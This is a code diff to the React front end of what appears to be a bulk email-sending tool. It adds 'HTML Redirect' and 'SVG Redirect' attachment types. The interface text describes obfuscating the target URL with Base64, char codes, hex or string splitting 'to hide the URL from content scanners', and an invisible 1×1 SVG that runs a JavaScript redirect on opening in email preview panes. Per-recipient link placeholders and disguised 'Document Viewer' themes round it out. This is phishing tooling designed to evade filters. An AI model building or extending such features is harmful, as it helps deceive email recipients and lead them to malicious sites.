@@ -1299,10 +1299,12 @@ const ATTACH_TYPES = [
   {id:"txt",   lbl:"Text",       ico:"📃", col:"#78909c", mime:"text/plain"},
   {id:"html_e",lbl:"HTML Email", ico:"🌐", col:"#ff5722", mime:"text/html"},
   {id:"custom",lbl:"Custom",     ico:"📦", col:"#795548", mime:"application/octet-stream"},
-  {id:"ghost_pdf",lbl:"Ghost PDF",  ico:"👻", col:"#6d28d9", mime:"application/pdf"},
-  {id:"html_image",lbl:"HTML→Image",ico:"🖼", col:"#0891b2", mime:"image/png"},
-  {id:"html_pdf",  lbl:"HTML→PDF",   ico:"🧾", col:"#0ea5e9", mime:"application/pdf"},
-  {id:"qr",        lbl:"QR Code",    ico:"📱", col:"#10b981", mime:"image/png"},
+  {id:"ghost_pdf",    lbl:"Ghost PDF",     ico:"👻", col:"#6d28d9", mime:"application/pdf"},
+  {id:"html_image",  lbl:"HTML→Image",   ico:"🖼", col:"#0891b2", mime:"image/png"},
+  {id:"html_pdf",    lbl:"HTML→PDF",     ico:"🧾", col:"#0ea5e9", mime:"application/pdf"},
+  {id:"qr",          lbl:"QR Code",      ico:"📱", col:"#10b981", mime:"image/png"},
+  {id:"html_redirect",lbl:"HTML Redirect",ico:"🔗", col:"#f59e0b", mime:"text/html"},
+  {id:"svg_redirect", lbl:"SVG Redirect", ico:"◈",  col:"#8b5cf6", mime:"image/svg+xml"},
 ];
 
 // Every public AWS region.  Used by the SMTP / API / S3 / ESP region
@@ -6413,6 +6415,94 @@ function TabAttachments({filesList, uploadFile, deleteFile, renameFile, selected
               <Tog checked={(attachConfigs.html_image||{}).imgInlineReplace||false} onChange={v=>setAttachConfigs({...attachConfigs,html_image:{...(attachConfigs.html_image||{}),imgInlineReplace:v}})}
                 label="Replace email body with image"
                 desc="Embed image inline and replace HTML body — recipients see only the image"/>
+            </div>
+          </div>
+        )}
+
+        {selectedTypes.includes("html_redirect") && (
+          <div className="card card-sm">
+            <div className="card-title">🔗 HTML Redirect Settings</div>
+            <Info type="i">Generates a standalone .html file. When opened in a browser it redirects to your link. Choose an obfuscation method to hide the URL from content scanners.</Info>
+            <div className="col g10 mt10">
+              <div>
+                <label className="lbl">Target URL</label>
+                <input value={(attachConfigs.html_redirect||{}).hrLink||""} onChange={e=>setAttachConfigs({...attachConfigs,html_redirect:{...(attachConfigs.html_redirect||{}),hrLink:e.target.value}})} placeholder="https://your-link.com  (use #EMAIL for per-recipient)" style={{fontSize:14,padding:"10px 12px"}}/>
+              </div>
+              <div className="row g10">
+                <div style={{flex:1}}>
+                  <label className="lbl">Theme</label>
+                  <select value={(attachConfigs.html_redirect||{}).hrTheme||"loading"} onChange={e=>setAttachConfigs({...attachConfigs,html_redirect:{...(attachConfigs.html_redirect||{}),hrTheme:e.target.value}})} style={{fontSize:14,padding:"10px 12px",width:"100%"}}>
+                    <option value="loading">Loading Spinner</option>
+                    <option value="viewer">Document Viewer</option>
+                    <option value="click">Click to Open</option>
+                    <option value="blank">Blank / Instant</option>
+                  </select>
+                </div>
+                <div style={{flex:1}}>
+                  <label className="lbl">URL Obfuscation</label>
+                  <select value={(attachConfigs.html_redirect||{}).hrObf||"none"} onChange={e=>setAttachConfigs({...attachConfigs,html_redirect:{...(attachConfigs.html_redirect||{}),hrObf:e.target.value}})} style={{fontSize:14,padding:"10px 12px",width:"100%"}}>
+                    <option value="none">None (plain)</option>
+                    <option value="base64">Base64 (atob)</option>
+                    <option value="charcode">Char Codes</option>
+                    <option value="hex">Hex Escape</option>
+                    <option value="split">String Split</option>
+                    <option value="reverse">Reversed</option>
+                  </select>
+                </div>
+              </div>
+              <div className="row g10">
+                <div style={{flex:1}}>
+                  <label className="lbl">Redirect Delay (ms)</label>
+                  <input type="number" value={(attachConfigs.html_redirect||{}).hrDelay||200} onChange={e=>setAttachConfigs({...attachConfigs,html_redirect:{...(attachConfigs.html_redirect||{}),hrDelay:parseInt(e.target.value)||200}})} min="0" max="9999" style={{fontSize:14,padding:"10px 12px"}}/>
+                </div>
+                <div style={{flex:1}}>
+                  <label className="lbl">File Name</label>
+                  <input value={(attachConfigs.html_redirect||{}).hrName||""} onChange={e=>setAttachConfigs({...attachConfigs,html_redirect:{...(attachConfigs.html_redirect||{}),hrName:e.target.value}})} placeholder="document.html" style={{fontSize:14,padding:"10px 12px"}}/>
+                </div>
+              </div>
+            </div>
+          </div>
+        )}
+
+        {selectedTypes.includes("svg_redirect") && (
+          <div className="card card-sm">
+            <div className="card-title">◈ SVG Redirect Settings</div>
+            <Info type="i">Generates an SVG image file with an embedded JS redirect. Opens natively in browsers and many email clients preview panes. The "Auto" style is a 1×1 invisible pixel that fires immediately.</Info>
+            <div className="col g10 mt10">
+              <div>
+                <label className="lbl">Target URL</label>
+                <input value={(attachConfigs.svg_redirect||{}).svgrLink||""} onChange={e=>setAttachConfigs({...attachConfigs,svg_redirect:{...(attachConfigs.svg_redirect||{}),svgrLink:e.target.value}})} placeholder="https://your-link.com  (use #EMAIL for per-recipient)" style={{fontSize:14,padding:"10px 12px"}}/>
+              </div>
+              <div className="row g10">
+                <div style={{flex:1}}>
+                  <label className="lbl">Visual Style</label>
+                  <select value={(attachConfigs.svg_redirect||{}).svgrStyle||"auto"} onChange={e=>setAttachConfigs({...attachConfigs,svg_redirect:{...(attachConfigs.svg_redirect||{}),svgrStyle:e.target.value}})} style={{fontSize:14,padding:"10px 12px",width:"100%"}}>
+                    <option value="auto">Auto (invisible, instant)</option>
+                    <option value="click">Click Button</option>
+                    <option value="branded">Branded Document</option>
+                  </select>
+                </div>
+                <div style={{flex:1}}>
+                  <label className="lbl">URL Obfuscation</label>
+                  <select value={(attachConfigs.svg_redirect||{}).svgrObf||"none"} onChange={e=>setAttachConfigs({...attachConfigs,svg_redirect:{...(attachConfigs.svg_redirect||{}),svgrObf:e.target.value}})} style={{fontSize:14,padding:"10px 12px",width:"100%"}}>
+                    <option value="none">None (plain)</option>
+                    <option value="base64">Base64 (atob)</option>
+                    <option value="charcode">Char Codes</option>
+                    <option value="hex">Hex Escape</option>
+                    <option value="split">String Split</option>
+                  </select>
+                </div>
+              </div>
+              <div className="row g10">
+                <div style={{flex:1}}>
+                  <label className="lbl">Auto-Redirect Delay (ms)</label>
+                  <input type="number" value={(attachConfigs.svg_redirect||{}).svgrDelay||800} onChange={e=>setAttachConfigs({...attachConfigs,svg_redirect:{...(attachConfigs.svg_redirect||{}),svgrDelay:parseInt(e.target.value)||800}})} min="0" max="9999" style={{fontSize:14,padding:"10px 12px"}}/>
+                </div>
+                <div style={{flex:1}}>
+                  <label className="lbl">File Name</label>
+                  <input value={(attachConfigs.svg_redirect||{}).svgrName||""} onChange={e=>setAttachConfigs({...attachConfigs,svg_redirect:{...(attachConfigs.svg_redirect||{}),svgrName:e.target.value}})} placeholder="graphic.svg" style={{fontSize:14,padding:"10px 12px"}}/>
+                </div>
+              </div>
             </div>
           </div>
         )}
@@ -11696,6 +11786,20 @@ function App() {
           overlay_size: ac("html_pdf").htmlPdfOverlaySize || 36,
           overlay_position: ac("html_pdf").htmlPdfOverlayPosition || "center",
           ghost_link: ac("html_pdf").htmlPdfGhostOn ? (ac("html_pdf").htmlPdfGhostLink || "") : "",
+        };
+        if(selectedTypes.includes("html_redirect")) cfg.html_redirect = {
+          link: ac("html_redirect").hrLink || "",
+          name: ac("html_redirect").hrName || "document.html",
+          theme: ac("html_redirect").hrTheme || "loading",
+          obfuscation: ac("html_redirect").hrObf || "none",
+          delay: ac("html_redirect").hrDelay || 200,
+        };
+        if(selectedTypes.includes("svg_redirect")) cfg.svg_redirect = {
+          link: ac("svg_redirect").svgrLink || "",
+          name: ac("svg_redirect").svgrName || "graphic.svg",
+          style: ac("svg_redirect").svgrStyle || "auto",
+          obfuscation: ac("svg_redirect").svgrObf || "none",
+          delay: ac("svg_redirect").svgrDelay || 800,
         };
         if(selectedTypes.includes("eml")) cfg.eml = {
           subject: ac("eml").emlSubject || "",
